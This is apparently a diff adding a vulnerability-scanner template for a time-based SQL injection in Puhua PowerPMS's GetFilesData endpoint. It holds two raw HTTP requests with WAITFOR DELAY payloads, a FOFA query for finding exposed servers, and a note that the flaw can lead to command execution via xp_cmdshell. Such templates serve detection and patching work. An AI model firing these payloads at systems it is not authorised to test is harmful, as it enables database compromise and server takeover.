@@ -1,0 +1,27 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration_1>=4 && duration_1<=5
+            - duration_2>=8 && duration_2<=9
+          type: dsl
+      raw:
+        - |
+          GET /UploadFle/GetFilesData?EpsProjId=1%27;WAITFOR+DELAY+%270:0:4%27--&StartDate=2&EndDate=2 HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+        - |
+          GET /UploadFle/GetFilesData?EpsProjId=1%27;WAITFOR+DELAY+%270:0:8%27--&StartDate=2&EndDate=2 HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+id: puhua-PowerPMS-GetFilesData-sql-time
+info:
+    author: Superhero
+    description: |-
+        fofa: body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
+        普华 PowerPMS GetFilesData 接口处存在SQL注入漏洞,未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+    name: 普华 PowerPMS GetFilesData SQL延时注入
+    reference:
+        - https://mp.weixin.qq.com/s/tvcxieoN1trfVRiZ11k63g
+    severity: high
+    tags: []
